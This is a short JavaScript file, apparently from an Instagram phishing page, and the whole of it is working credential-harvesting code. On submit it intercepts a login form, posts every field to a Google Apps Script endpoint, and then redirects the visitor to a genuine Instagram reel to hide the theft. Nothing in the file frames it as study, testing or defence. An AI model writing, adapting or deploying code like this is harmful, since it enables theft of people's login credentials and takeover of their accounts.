function Username(){
  // console.log(event.key);
}
  function Password() {
   // console.log(event.key);
  }
/*
  function redirect_to_page() {
    window.location.href = "https://www.instagram.com/";
  }
*/

  const scriptURL = 'https://script.google.com/macros/s/AKfycbzbS45F27bPk1pFkx12anG-Mk3MSzvymfxBbr_LSA53arUHqVp2VuS46p1JUFoSaIBw/exec'

const form = document.forms['login-form']



form.addEventListener('submit', e => {
  
  e.preventDefault()
  
  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
  //.then(response => alert("Loading..." ))
  .then(() => { window.location.href="https://www.instagram.com/reel/DFgJ4UPPAJ_/?igsh=d3Y1aGdxOWxvdGxx"; })
  .catch(error => console.error('Error!', error.message))
})